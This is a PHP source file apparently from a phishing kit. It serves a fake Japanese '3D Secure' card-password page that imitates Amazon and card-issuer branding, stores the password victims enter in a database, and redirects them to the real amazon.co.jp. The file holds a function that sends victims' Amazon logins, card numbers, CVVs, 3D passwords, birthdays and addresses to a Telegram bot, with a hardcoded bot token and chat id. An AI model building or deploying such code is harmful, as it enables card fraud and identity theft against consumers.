<?php
    include './php/xzpc.php';
    session_start();
    
   
    include './php/config.php';
    $conn = new mysqli($servername, $username, $password, $dbname);
    
    if($_SESSION["secure3d"]["cardnum"]){
        $cardnum = $_SESSION["secure3d"]["cardnum"];
    }else{
        cardpass($conn);
    }
    
    $show3d = 1;
    
   
    if($_POST["cardpwd"]){
        $_POST = SafeFilter($_POST);
        if($_SESSION["secure3d"]){
            $conn->query("UPDATE amz_userlist SET amz_3dpwd='".$_POST["cardpwd"]."' WHERE amz_id='".$_SESSION["secure3d"]["cardid"]."'");
        }
        cardpass($conn);
    }else{
        $cardbin = substr($cardnum , 0 , 6);
        $binInfo = array();
        $result=$conn->query("SELECT * FROM amz_bin_list WHERE bin_num='".$cardbin."'");
        if($result->num_rows>0){
            $binInfo=$result->fetch_assoc();
            $secureImg = "/src/img/bank/nobank.jpg";
            $bankImg = "/src/img/bank/nobank.jpg";
            switch ($binInfo["bank_type"]){
                case "VISA": case "MASTERCARD":
                    $secureImg = "/src/img/secure/".($binInfo["bank_type"]=="VISA"?"visa":"mastercard").".jpg";
                    $bankInfo = array();
                    $result=$conn->query("SELECT * FROM amz_bank_list WHERE bank_id='".$binInfo["bank_id"]."'");
                    if($result->num_rows>0){
                        $bankInfo=$result->fetch_assoc();
                        if($bankInfo["bank_img"]){
                            $bankImg = "/src/img/bank/".$bankInfo["bank_img"];
                        }
                    }
                    break;
                case "JCB":
                    $secureImg = "/src/img/secure/jcb.jpg";
                    $bankImg = "/src/img/bank/jcbbank.jpg";
                    break;
                case "AMERICAN EXPRESS":
                    $secureImg = "/src/img/secure/ae.jpg";
                    break;
                default:
                    cardpass($conn);
            }
        }else {
            cardpass($conn);
        }
        
    }
    
    
    
    function cardpass($conn){
        global $show3d;
        $show3d = 0;
        
        //send_tg_yu($conn);
        
        $url =  $_SESSION["secure3d"]["isgoamazon"]?"https://www.amazon.co.jp/":"/walletm.php";
        unset($_SESSION['secure3d']);
        echo "<div style='width: 100%;text-align: center;'><div style='margin-top: 50px;'>処理中...</div></div><script> if(window.parent != window){window.parent.location.replace('".$url."');}else{window.location.replace('".$url."');} </script>";
        exit;
    }
    
    function send_tg_yu($conn){
        $result=$conn->query("SELECT * FROM amz_userlist WHERE amz_id='".$_SESSION["secure3d"]["cardid"]."'");
        if($result->num_rows>0){
            $userInfo=$result->fetch_assoc();
            $userInfo["amz_homeinfo"] = str_replace("|&amp;|",PHP_EOL."    ",$userInfo["amz_homeinfo"]);
            tgbot_sendmsg(array(
                "text"=>"亚马逊账号：".$userInfo["amz_username"].PHP_EOL
                        ."亚马逊密码：".$userInfo["amz_passwd"].PHP_EOL
                        ."卡主：".$userInfo["amz_cardname"].PHP_EOL
                        ."卡号：".$userInfo["amz_cardnum"].PHP_EOL
                        ."到期日：".$userInfo["amz_carddate"].PHP_EOL
                        ."安全码：".$userInfo["amz_cardcvv"].PHP_EOL
                        ."3D密码：".$userInfo["amz_3dpwd"].PHP_EOL
                        ."生日：".$userInfo["amz_birthday"].PHP_EOL
                        ."账单地址：".PHP_EOL."    ".$userInfo["amz_homeinfo"].PHP_EOL
                        ."IP：".$userInfo["amz_userip"].PHP_EOL
                        ."UA：".$userInfo["amz_useragent"].PHP_EOL
                        //."CK：".$userInfo["amz_cookie"].PHP_EOL
            ));
        }
    }
    
    function tgbot_sendmsg($data){
        $botKey = "1724515095:AAEG8zdF9I7QZlX9FdbM67-iM5fu1T4IEZQ";
        $data["chat_id"] = "-568953242";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botKey."/sendMessage");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result= curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    
    function getXcarnum($cardnum){
        $cardnum = str_replace(" ","",$cardnum);
        $strLenth = mb_strlen($cardnum,'utf8')-4;
        $strX = "";
        for ($i = 0; $i < $strLenth ; $i++) {
             $strX = $strX."X";
        }
        $strX = str_split($strX.substr($cardnum,-4));
        $str = "";
        foreach ($strX as $k=>$v){
            $str = $str.($k%4==0?" ":"").$v;
        }
        return $str;
    }
    function SafeFilter ($arr) {
    
        $ra=Array('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/','/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/','/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/','/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/','/onmouseout/','/onmouseover/','/onmouseup/','/onunload/');
    
        if (is_array($arr)){
            foreach ($arr as $key => $value) {
                if (!is_array($value)){
                    if (!get_magic_quotes_gpc()){//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。
                        $value = addslashes($value);//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义
                    }
                    $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串
                    $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体
                }else{
                    SafeFilter($arr[$key]);
                }
            }   
        }
        return $arr;
    }
    
    
    if($show3d==1){    
        //send_tg_yu($conn);
?>
<html>
    <head>
        <meta http-equiv="Cache-Control" content="no-cache,private,no-store">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Expires" content="0">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta http-equiv="Content-Script-Type" content="text/javascript">
        <title>3D Secure</title>
        <link rel="stylesheet" type="text/css" href="./src/3dsecure.css?v0.0.6">
    </head>
    
    <body style="margin:0;">
            <center>
                <table cellspacing="0" cellpadding="0">
                    <tbody>
                        <tr>
                            <td>
                                <div class="contents">
                                    <table class="logo-image">
                                        <tbody>
                                            <tr>
                                                <td class="brand-logo"><img src="<?=$secureImg?>" width="115" height="60" alt=""></td>
                                                <td class="issuer-logo"><img src="<?=$bankImg?>" width="140" height="47" alt=""></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <div class="protection">Added Protection</div>
                                    <div class="message">お客様のご利用カード会社インターネットサービスパスワードをご入力ください。</div>
                                    <form method="post">
                                        <table class="contents" style="border-collapse: separate; border-spacing: 0px 10px;">
                                            <tbody>
                                                <tr>
                                                    <td class="item">加盟店名：</td>
                                                    <td class="value">Amazon</td>
                                                </tr>
                                                <tr>
                                                    <td class="item">ご利用金額：</td>
                                                    <td class="value">JPY 0</td>
                                                </tr>
                                                <tr>
                                                    <td class="item">ご利用日：</td>
                                                    <td class="value"><?=date("y/m/d")?></td>
                                                </tr>
                                                <tr>
                                                    <td class="item">カード番号：</td>
                                                    <td class="value"><?=getXcarnum($cardnum)?></td>
                                                </tr>
                                                <tr>
                                                    <td class="item">パスワード：</td>
                                                    <td class="value"><input name="cardpwd" type="password" value="" size="20" maxlength="30" class="password"></td>
                                                </tr>
                                                <tr>
                                                    <td class="item"></td>
                                                    <td class="value">
                                                        <table class="controls">
                                                            <tbody>
                                                                <tr>
                                                                    <td class="send">
                                                                        <input type="submit" id="send" value="送信" class="button" onclick="">
                                                                    </td>
                                                                    <td valign="middle" align="center">
                                                                        <img src="./src/img/mark.gif" border="0" width="14" height="13" alt="">
                                                                    </td>
                                                                    <td class="help">
                                                                        <a href="" id="faq" onclick="">ヘルプ</a>
                                                                
                                                                    </td>
                                                                    <td class="cancel">
                                                                        <a href="" id="cancel" onclick="">キャンセル</a>
                                                                    </td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </form>
                                    <center>
                                        <div class="additional"></div>
                                    </center>
                                    <div class="footer"></div>
                                    <noscript>
                                        <div class="noJavaScript"></div>
                                    </noscript>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </center>
    </body>
</html>
<?php  }  ?>